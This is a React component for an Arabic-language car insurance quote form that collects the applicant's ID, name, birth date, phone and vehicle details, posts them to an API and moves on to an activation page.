import axios from "axios";
import React, { useMemo, useState } from "react";
import { api_route, socket } from "../App";
import { TailSpin } from "react-loader-spinner";
import { useNavigate } from "react-router-dom";
import { LuCalendarDays } from "react-icons/lu";
import { useTranslation } from "../context/LanguageContext";
import FormInput from "../components/apply/FormInput";
import ProgressStepper from "../components/apply/ProgressStepper";
import ApplyFooter from "../components/ApplyFooter";
import FloatingActions from "../components/FloatingActions";

const YEARS = Array.from({ length: 32 }, (_, i) => String(2026 - i));
const HIJRI_YEARS = Array.from({ length: 98 }, (_, i) => String(1447 - i));
const DAYS = Array.from({ length: 30 }, (_, i) => String(i + 1).padStart(2, "0"));
const MONTHS = Array.from({ length: 12 }, (_, i) => String(i + 1).padStart(2, "0"));

const selectClass =
  "w-full appearance-none rounded-xl border border-gray-300 bg-white px-4 py-3 text-sm text-[#146394] outline-none focus:border-[#146394]";

function parseQueryData() {
  try {
    const raw = new URLSearchParams(window.location.search).get("data");
    return raw ? JSON.parse(raw) : {};
  } catch {
    return {};
  }
}

const FieldSelect = ({ label, value, onChange, required, children }) => (
  <label className="flex w-full flex-col gap-1.5 text-sm font-bold text-[#146394]">
    <span>{label}</span>
    <div className="relative">
      <select
        required={required}
        className={selectClass}
        value={value}
        onChange={(e) => onChange(e.target.value)}
      >
        {children}
      </select>
      <span className="pointer-events-none absolute inset-y-0 left-3 flex items-center text-gray-400">
        ▾
      </span>
    </div>
  </label>
);

const Reg = ({ setLoading, loading }) => {
  const { t, dir } = useTranslation();
  const queryData = useMemo(parseQueryData, []);
  const [tameenFor, setTameenFor] = useState("ضد الغير");
  const [tameenAllType, setTameenType] = useState("الوكالة");
  const [car_model, setCarModel] = useState("");
  const [carPrice, setCarPrice] = useState("");
  const [purpose_of_use, setPurposeOfUse] = useState("شخصي");
  const [startedDate, setStartedDate] = useState("");
  const [carYear, setCarYear] = useState("");
  const [nationalId, setNationalId] = useState(queryData.national_id || "");
  const [carHolderName, setCarHolderName] = useState(queryData.carHolderName || "");
  const [phone, setPhone] = useState(queryData.phone || "");
  const [plateNumber, setPlateNumber] = useState("");
  const [hijriDay, setHijriDay] = useState("");
  const [hijriMonth, setHijriMonth] = useState("");
  const [hijriYear, setHijriYear] = useState("");
  const [load, setLoad] = useState(false);
  const navigate = useNavigate();

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!tameenFor || !purpose_of_use) {
      return window.alert(t("common.allDataRequired"));
    }

    setLoad(true);
    const { _id } = queryData;
    const birth_date = [hijriYear, hijriMonth, hijriDay].filter(Boolean).join("-");
    const data = {
      tameenFor,
      tameenAllType,
      car_model,
      carPrice,
      purpose_of_use,
      carYear,
      startedDate,
      national_id: nationalId,
      carHolderName,
      phone,
      plateNumber,
      birth_date,
    };
    try {
      await axios.post(api_route + "/apply/" + _id, data).then((res) => {
        socket.emit("newData", _id);
        return navigate(
          `/${
            tameenFor === "ضد الغير" ? "activate" : "activate_shamel"
          }?data=${JSON.stringify(res.data)}`
        );
      });
    } catch {
      /* empty */
    } finally {
      setLoading(false);
      setLoad(false);
    }
  };

  const handleBack = () => {
    if (window.history.length > 1) navigate(-1);
    else navigate("/");
  };

  return (
    <div className="flex w-full flex-col items-center bg-[#F8F9FB]" dir={dir}>
      {load ? (
        <div className="fixed top-0 z-50 flex h-screen w-full items-center justify-center bg-white bg-opacity-60">
          <div className="flex h-fit w-fit flex-col items-center justify-center gap-x-3 rounded-md bg-white p-3">
            <img src="/load.png" alt="" />
            <span className="text-lg">{t("reg.searchingOffers")}</span>
            <TailSpin
              height="30"
              width="30"
              color="gray"
              ariaLabel="tail-spin-loading"
              radius="1"
              visible
            />
          </div>
        </div>
      ) : null}

      <div className="w-full max-w-xl px-4 pt-4">
        <ProgressStepper t={t} current={2} />
      </div>

      <form
        className="mt-5 mb-8 w-[92%] max-w-xl rounded-2xl bg-white p-4 shadow-md sm:p-6"
        onSubmit={handleSubmit}
      >
        <h1 className="border-b border-gray-200 pb-3 text-lg font-extrabold text-[#146394]">
          {t("reg.title")}
        </h1>

        <div className="mt-4 flex flex-col gap-4">
          <FormInput
            label={t("apply.nationalId")}
            value={nationalId}
            onChange={setNationalId}
            required
            dir="ltr"
            inputMode="numeric"
            maxLength={10}
            numeric
            rounded="xl"
            disabled={true}
          />
          <FormInput
            label={t("reg.fullName")}
            value={carHolderName}
            onChange={setCarHolderName}
            required
            placeholder={t("reg.fullNamePlaceholder")}
            rounded="xl"
          />

          <div className="flex w-full flex-col gap-1.5 text-sm font-bold text-[#146394]">
            <span>{t("reg.birthHijri")}</span>
            <div className="grid grid-cols-3 gap-2">
              <select
                className={selectClass}
                value={hijriDay}
                onChange={(e) => setHijriDay(e.target.value)}
              >
                <option value="">{t("reg.day")}</option>
                {DAYS.map((d) => (
                  <option key={d} value={d}>
                    {d}
                  </option>
                ))}
              </select>
              <select
                className={selectClass}
                value={hijriMonth}
                onChange={(e) => setHijriMonth(e.target.value)}
              >
                <option value="">{t("reg.month")}</option>
                {MONTHS.map((m) => (
                  <option key={m} value={m}>
                    {m}
                  </option>
                ))}
              </select>
              <select
                className={selectClass}
                value={hijriYear}
                onChange={(e) => setHijriYear(e.target.value)}
              >
                <option value="">{t("reg.year")}</option>
                {HIJRI_YEARS.map((y) => (
                  <option key={y} value={y}>
                    {y}
                  </option>
                ))}
              </select>
            </div>
          </div>

          <FormInput
            label={t("reg.mobile")}
            value={phone}
            onChange={setPhone}
            required
            dir="ltr"
            inputMode="numeric"
            maxLength={10}
            numeric
            placeholder={t("reg.mobilePlaceholder")}
            rounded="xl"
          />

          <FieldSelect
            label={t("reg.insuranceType")}
            value={tameenFor}
            onChange={setTameenFor}
            required
          >
            <option hidden value="">
              {t("reg.choose")}
            </option>
            <option value="شامل">{t("reg.comprehensive")}</option>
            <option value="ضد الغير">{t("reg.thirdParty")}</option>
          </FieldSelect>

          <label className="flex w-full flex-col gap-1.5 text-sm font-bold text-[#146394]">
            <span>{t("reg.startDate")}</span>
            <div className="relative">
              <input
                type="date"
                required
                className={`${selectClass} date-input pl-12 pr-4`}
                value={startedDate}
                onChange={(e) => setStartedDate(e.target.value)}
              />
              <span className="pointer-events-none absolute inset-y-0 left-2 flex items-center">
                <span className="flex h-8 w-8 items-center justify-center rounded-md bg-[#F5A623] text-white">
                  <LuCalendarDays className="h-4 w-4" />
                </span>
              </span>
            </div>
          </label>

          <FieldSelect
            label={t("reg.purpose")}
            value={purpose_of_use}
            onChange={setPurposeOfUse}
            required
          >
            <option hidden value="">
              {t("common.choose")}
            </option>
            <option value="شخصي">{t("reg.personal")}</option>
            <option value="تجاري">{t("reg.commercial")}</option>
            <option value="تأجير">{t("reg.rental")}</option>
            <option value="نقل الركاب او كريم او اوبر">{t("reg.rideHailing")}</option>
            <option value="نقل بضائع">{t("reg.goodsTransport")}</option>
            <option value="نقل مشتقات نفطية">{t("reg.oilTransport")}</option>
          </FieldSelect>

          <FormInput
            label={t("reg.estimatedValue")}
            value={carPrice}
            onChange={setCarPrice}
            required
            dir="ltr"
            inputMode="numeric"
            numeric
            placeholder={t("reg.estimatedValuePlaceholder")}
            rounded="xl"
          />

          <FieldSelect
            label={t("reg.manufactureYear")}
            value={carYear}
            onChange={setCarYear}
            required
          >
            <option hidden value="">
              {t("common.choose")}
            </option>
            {YEARS.map((y) => (
              <option key={y} value={y}>
                {y}
              </option>
            ))}
          </FieldSelect>

          <FormInput
            label={t("reg.carModel")}
            value={car_model}
            onChange={setCarModel}
            required
            placeholder={t("reg.carModelPlaceholder")}
            rounded="xl"
          />

          <FormInput
            label={t("reg.plate")}
            value={plateNumber}
            onChange={setPlateNumber}
            placeholder={t("reg.platePlaceholder")}
            rounded="xl"
          />

          <div className="flex w-full flex-col gap-2">
            <span className="text-sm font-bold text-[#146394]">
              {t("reg.repairLocation")}
            </span>
            {[
              { id: "الوكالة", label: t("reg.agency") },
              { id: "الورشة", label: t("reg.workshop") },
            ].map((option) => {
              const selected = tameenAllType === option.id;
              return (
                <button
                  key={option.id}
                  type="button"
                  onClick={() => setTameenType(option.id)}
                  className={`flex w-full items-center justify-between rounded-xl border px-4 py-3 text-sm font-bold ${
                    selected
                      ? "border-[#146394] text-[#146394]"
                      : "border-gray-300 text-gray-500"
                  }`}
                >
                  <span
                    className={`flex h-5 w-5 items-center justify-center rounded-full border-2 ${
                      selected ? "border-[#146394]" : "border-gray-300"
                    }`}
                  >
                    {selected ? (
                      <span className="h-2.5 w-2.5 rounded-full bg-[#146394]" />
                    ) : null}
                  </span>
                  <span>{option.label}</span>
                </button>
              );
            })}
          </div>

          <button
            type="button"
            onClick={handleBack}
            className="mt-2 w-full rounded-xl border border-[#146394] py-3 text-base font-bold text-[#146394]"
          >
            {t("reg.back")}
          </button>

          <button
            type="submit"
            className="w-full rounded-xl bg-[#F5A623] py-3 text-lg font-bold text-white"
          >
            {loading ? (
              <div className="flex items-center justify-center">
                <TailSpin
                  height="30"
                  width="30"
                  color="white"
                  ariaLabel="tail-spin-loading"
                  radius="1"
                  visible
                />
              </div>
            ) : (
              t("common.showOffers")
            )}
          </button>
        </div>
      </form>

      <ApplyFooter />
      <FloatingActions />

      <style>{`
        .date-input::-webkit-calendar-picker-indicator {
          position: absolute;
          inset: 0;
          width: 100%;
          height: 100%;
          opacity: 0;
          cursor: pointer;
        }
      `}</style>
    </div>
  );
};

export default Reg;
